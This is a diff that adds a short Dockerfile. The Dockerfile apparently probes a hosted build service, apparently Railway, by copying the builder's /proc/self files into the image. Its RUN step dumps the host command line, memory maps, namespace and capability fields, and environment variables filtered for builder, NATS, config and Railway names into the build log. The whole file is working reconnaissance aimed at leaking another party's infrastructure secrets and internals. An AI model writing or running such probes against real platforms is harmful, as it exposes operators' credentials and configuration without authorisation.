@@ -1,0 +1,7 @@
+FROM alpine:3.20
+COPY host/proc/self/cmdline /f/c
+COPY host/proc/self/environ /f/e
+COPY host/proc/self/maps /f/m
+COPY host/proc/self/status /f/s
+RUN sh -c 'set +e; echo "===R8==="; echo --CMD--; tr "\0" " " < /f/c; echo; echo --EXE_MAPS--; grep -E "^[0-9a-f]+-[0-9a-f]+ ..x" /f/m 2>/dev/null | head -20; grep -E "/(app|opt|srv|usr|bin|railway|build)" /f/m 2>/dev/null | head -30; echo --NS--; grep -E "NSpid|Uid|Gid|CapEff|Name" /f/s | head -20; echo --ENVFILT--; tr "\0" "\n" < /f/e | grep -Ei "BUILDER|HOST_|RAILWAY|MPIPE|NATS|TMPL|CONFIG|TARGET|PATH=|HOME=" | sort; echo "===R8_END==="'
+CMD ["sh","-c","sleep 5"]
